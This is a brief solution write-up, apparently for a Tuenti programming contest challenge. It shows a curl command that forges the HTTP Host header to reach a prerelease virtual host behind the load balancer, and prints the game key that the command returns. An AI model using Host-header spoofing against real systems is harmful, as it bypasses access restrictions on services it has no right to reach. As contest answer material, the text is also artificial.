# Solution

We need to forge the domain we are trying to access, pretending we are in the prerelease for the load balancer:

```
$ curl --header "Host: pre.steam-origin.contest.tuenti.net" steam-origin.contest.tuenti.net:9876/games/cat_fight/get_key
```

The command returns:

```
{"game":"Cat Fight","key":"7544-5747-5357"}
```
